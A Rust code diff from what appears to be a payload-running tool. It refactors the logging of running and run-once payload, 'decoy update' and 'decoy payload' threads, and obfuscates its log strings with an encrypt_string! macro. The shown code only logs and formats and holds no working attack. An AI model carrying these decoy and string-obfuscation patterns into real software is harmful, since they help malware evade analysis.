@@ -1,8 +1,11 @@
 use crate::payload::Payload;
+use crate::rundata::RunData;
 
 use anyhow::Result;
 use chksum_sha2_512 as sha2_512;
+use serde::{Deserialize, Serialize};
 use shellexpand;
+use std::env;
 use std::fs;
 use std::fs::create_dir_all;
 use std::fs::File;
@@ -12,8 +15,6 @@ use std::os::unix::fs::PermissionsExt;
 use std::path::Path;
 use std::path::PathBuf;
 use std::thread;
-use std::env;
-use serde::{Deserialize, Serialize};
 
 use cryptify::encrypt_string;
 use log::error;
@@ -78,33 +79,65 @@ pub fn same_hash_sha512(hash: &String, path: &PathBuf) -> bool {
     digest.to_hex_lowercase() == *hash
 }
 
-pub fn print_running_thread(running_thread: &mut Vec<(thread::JoinHandle<()>, Payload)>) {
+pub fn print_rundata(run_data: &mut RunData) {
+    info!("{}", encrypt_string!("[+] PRINT RUN_DATA"));
+    print_running_thread(
+        &mut run_data.running_thread_payload,
+        encrypt_string!("payload thread"),
+    );
+    print_runonce(&mut run_data.runonce_payload, encrypt_string!("payload"));
+
+    print_running_thread(
+        &mut run_data.running_thread_decoy_update,
+        encrypt_string!("decoy update thread"),
+    );
+    print_runonce(
+        &mut run_data.runonce_decoy_update,
+        encrypt_string!("decoy update"),
+    );
+
+    print_running_thread(
+        &mut run_data.running_thread_decoy_payload,
+        encrypt_string!("decoy payload thread"),
+    );
+    print_runonce(
+        &mut run_data.runonce_decoy_payload,
+        encrypt_string!("decoy payload"),
+    );
+}
+
+pub fn print_running_thread(
+    running_thread: &mut Vec<(thread::JoinHandle<()>, Payload)>,
+    msg: String,
+) {
     if running_thread.len() != 0 {
         info!(
-            "{}{}",
-            encrypt_string!("[+] RUNNING thread: "),
+            "{}{}: {}",
+            encrypt_string!("[+] RUNNING "),
+            msg,
             running_thread.len()
         );
         for i in running_thread {
             info!("{}{:?}", encrypt_string!("-thread: "), i.1);
         }
     } else {
-        info!("{}", encrypt_string!("[+] no RUNNING thread"));
+        info!("{}{}", encrypt_string!("[+] no RUNNING "), msg);
     };
 }
 
-pub fn print_runonce(runonce: &mut Vec<Payload>) {
+pub fn print_runonce(runonce: &mut Vec<Payload>, msg: String) {
     if runonce.len() != 0 {
         info!(
-            "{}{}",
-            encrypt_string!("[+] RUNONCE payload: "),
+            "{}{}: {}",
+            encrypt_string!("[+] RUNONCE "),
+            msg,
             runonce.len()
         );
         for i in runonce {
             info!("{}{:?}", encrypt_string!("-runonce: "), i);
         }
     } else {
-        info!("{}", encrypt_string!("[+] no RUNONCE payload"));
+        info!("{}{}", encrypt_string!("[+] no RUNONCE "), msg);
     };
 }
 
@@ -126,10 +159,10 @@ impl CommandLine {
     pub fn get_buffer(&self) -> Vec<String> {
         match self.clone() {
             CommandLine::ArgParse() => env::args().collect(),
-            CommandLine::Txt(commandline) => 
-                commandline.split_whitespace()
+            CommandLine::Txt(commandline) => commandline
+                .split_whitespace()
                 .map(|mot| mot.to_string())
-                .collect()
+                .collect(),
         }
     }
     pub fn get_string(&self) -> String {
